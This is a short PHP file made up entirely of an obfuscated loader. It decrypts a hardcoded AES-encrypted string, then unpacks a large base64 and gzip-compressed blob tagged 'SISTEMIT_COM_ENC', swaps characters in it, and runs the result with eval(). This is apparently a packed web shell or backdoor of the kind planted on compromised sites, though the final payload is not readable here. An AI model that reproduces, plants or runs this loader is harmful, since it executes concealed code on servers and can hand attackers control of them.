<?php
function cooing($pesan, $encryption_key){
    $key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; 
  } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = cooing('K6Va2XVBXbURp6yajXJLnBRsnFmRxw6Xp+0V/u89eCVCqRdS47w1uTiVsYyLmEXHLKgEpkc84r8fJ09Ii4rNQBK8hDzIprywS96ekLByi5UVoBRL3oKnwCX9bZpkeHIOXO8k5Z9ycWl2XEmBj/Fyoy8lX8VtaWd/YQIm7S2ViGwkuo5rWOCAe1KHjrUybF2gA752l4vFM8TbpwPGrWLSWxtplLBqziLJcLRiUAtpTVn93FmxD25sqWfiUx5HMcdADGQmMumWFtAFWyhQy53238a971r3JO8M',$private_secret_key); 
$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>